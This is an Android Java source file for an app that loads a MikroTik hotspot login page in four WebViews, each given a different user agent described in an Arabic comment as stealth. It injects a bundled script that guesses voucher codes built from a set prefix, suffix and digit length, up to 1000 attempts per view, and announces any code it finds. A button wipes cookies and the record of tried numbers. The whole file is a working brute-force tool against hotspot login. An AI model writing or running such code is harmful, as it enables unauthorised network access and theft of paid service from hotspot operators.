package com.example.mikrotikbrowser;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class MainActivity extends Activity {
    private WebView[] webs = new WebView[4];
    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts;
    private TextView statusText;
    private SharedPreferences prefs;
    private String jsCode = "";
    private String targetUrl = "";
    private final String[] UAS = {
        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    };

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        urlBar = findViewById(R.id.urlBar);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        statusText = findViewById(R.id.statusText);
        
        webs[0] = findViewById(R.id.web0);
        webs[1] = findViewById(R.id.web1);
        webs[2] = findViewById(R.id.web2);
        webs[3] = findViewById(R.id.web3);

        urlBar.setText(prefs.getString("url", "http://7.7.7.7/index.html"));
        etPrefix.setText(prefs.getString("prefix", "5"));
        etSuffix.setText(prefs.getString("suffix", "31"));
        etDigits.setText(prefs.getString("digits", "7"));
        etAttempts.setText(prefs.getString("attempts", "1000"));

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            jsCode = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) { statusText.setText("خطأ تحميل السكربت"); }

        // إعداد المتصفحات الأربعة ببصمات مختلفة (تخفي)
        for (int i = 0; i < 4; i++) {
            WebSettings s = webs[i].getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            s.setUserAgentString(UAS[i]); // كل شاشة لها بصمة مختلفة
            CookieManager.getInstance().setAcceptThirdPartyCookies(webs[i], true);
            webs[i].addJavascriptInterface(new Bridge(i), "AndroidBridge" + i);
        }

        findViewById(R.id.btnGo).setOnClickListener(v -> {
            targetUrl = urlBar.getText().toString().trim();
            if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
            prefs.edit().putString("url", targetUrl).apply();
            for (int i = 0; i < 4; i++) webs[i].loadUrl(targetUrl);
            statusText.setText("تم تحميل الرابط في 4 شاشات");
        });

        findViewById(R.id.btnStart).setOnClickListener(v -> startAll());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopAll());
        findViewById(R.id.btnClear).setOnClickListener(v -> {
            prefs.edit().remove("tried_" + targetUrl).apply();
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
            statusText.setText("تم مسح الكوكيز والأرقام");
        });

        // تحميل أولي
        targetUrl = urlBar.getText().toString();
        for (int i = 0; i < 4; i++) webs[i].loadUrl(targetUrl);
    }

    private void startAll() {
        prefs.edit()
            .putString("prefix", etPrefix.getText().toString())
            .putString("suffix", etSuffix.getText().toString())
            .putString("digits", etDigits.getText().toString())
            .putString("attempts", etAttempts.getText().toString())
            .apply();

        String p = etPrefix.getText().toString().trim();
        String s = etSuffix.getText().toString().trim();
        int d = parseInt(etDigits, 7);
        int a = parseInt(etAttempts, 1000);

        for (int i = 0; i < 4; i++) {
            String cfg = "window.FINDER_CONFIG={id:" + i + ",prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:200};";
            webs[i].evaluateJavascript(cfg, null);
            webs[i].evaluateJavascript(jsCode, null);
        }
        statusText.setText("▶ بدء التخمين في 4 شاشات...");
    }

    private void stopAll() {
        for (int i = 0; i < 4; i++) {
            webs[i].evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        }
        statusText.setText("⏹ تم الإيقاف");
    }

    private int parseInt(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
    }

    public class Bridge {
        private final int id;
        public Bridge(int id) { this.id = id; }

        @JavascriptInterface public void log(final String m) {
            runOnUiThread(() -> statusText.setText("[W" + id + "] " + m));
        }
        @JavascriptInterface public void progress(final int c, final int t, final String v) {
            runOnUiThread(() -> statusText.setText("[W" + id + "] [" + c + "/" + t + "] " + v));
        }
        @JavascriptInterface public void found(final String v, final String st) {
            runOnUiThread(() -> {
                statusText.setText("✅✅✅ W" + id + " وجد الكرت: " + v);
                Toast.makeText(MainActivity.this, "✅ W" + id + ": " + v, Toast.LENGTH_LONG).show();
            });
        }
    }
}
